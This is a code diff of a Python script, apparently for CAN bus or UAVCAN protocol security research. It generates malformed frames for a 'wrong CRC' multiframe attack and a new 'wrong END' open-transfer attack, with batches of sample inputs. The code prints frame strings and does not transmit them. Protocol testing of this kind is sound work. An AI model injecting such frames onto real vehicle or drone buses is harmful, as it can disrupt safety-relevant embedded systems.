@@ -15,8 +15,7 @@ class CAN_PAYLOAD:
 
 class attack:
     # send multiframe message with wrong CRC
-    # tail byte에 있는 transfer_ID 어떻게 할 것인지
-    def wrong_CRC(CRC = 'AA AA', payload = 'BB BB BB BB', padding = True):
+    def wrong_CRC(self, CRC = 'AA AA', payload = 'BB BB BB BB', padding = True):
         payload = payload.split(' ')
 
         transfer_start  = 0b1
@@ -88,24 +87,60 @@ class attack:
 
         print()
 
-    def force_begin():
-        pass
+    def wrong_CRC_test(self):
+        print("''' wrong CRC attack sample input '''")
+        self.wrong_CRC('A1 A2', 'C1', False)    
+        self.wrong_CRC('A1 A2', 'C1 C2')
+        self.wrong_CRC('A1 A2', 'C1 C2 C3')
+        self.wrong_CRC('A1 A2', 'C1 C2 C3 C4')
+        self.wrong_CRC('A1 A2', 'C1 C2 C3 C4 C5')
+
+        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6')
+        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7')
+
+        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7 B8 B9 B0 B0 B0')
+        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7 B8 B9 B0 B0 B0 B0')
+
+        self.wrong_CRC('A1 A2', 'B1 B2 B3 B5 B5 B6 B7 B8 B9 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0')
+
+    # send singleframe message with open end
+    def wrong_END(self, payload = 'BB BB BB BB', padding = True):
+        payload = payload.split(' ')
+
+        transfer_start  = 0b1
+        transfer_end    = 0b0
+        toggle          = 0b0
+        transfer_ID     = 0b00000
+
+        if padding: payload += ["00" for _ in range(7 - len(payload))]
+        print(CAN.build(
+                'can0', 
+                10015501, 
+                f'{" ".join(payload)}', 
+                CAN_PAYLOAD.build(
+                    transfer_start, 
+                    transfer_end, 
+                    toggle, 
+                    transfer_ID
+                    )
+                )
+            )
+
+    def wrong_END_test(self):
+        print("''' wrong end attack sample input '''")
+        self.wrong_END('C1', False)    
+        self.wrong_END('C1 C2')
+        self.wrong_END('C1 C2 C3')
+        self.wrong_END('C1 C2 C3 C4')
+        self.wrong_END('C1 C2 C3 C4 C5')
+
+        self.wrong_END('B1 B2 B3 B4 B5 B6')
+        self.wrong_END('B1 B2 B3 B4 B5 B6 B7')
 
 
 def main():
-    attack.wrong_CRC('A1 A2', 'C1', False)    
-    attack.wrong_CRC('A1 A2', 'C1 C2')
-    attack.wrong_CRC('A1 A2', 'C1 C2 C3')
-    attack.wrong_CRC('A1 A2', 'C1 C2 C3 C4')
-    attack.wrong_CRC('A1 A2', 'C1 C2 C3 C4 C5')
-
-    attack.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6')
-    attack.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7')
-
-    attack.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7 B8 B9 B0 B0 B0')
-    attack.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7 B8 B9 B0 B0 B0 B0')
-
-    attack.wrong_CRC('A1 A2', 'B1 B2 B3 B5 B5 B6 B7 B8 B9 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0')    
+    attack().wrong_CRC_test()
+    attack().wrong_END_test()
 
 
 if __name__ == "__main__":
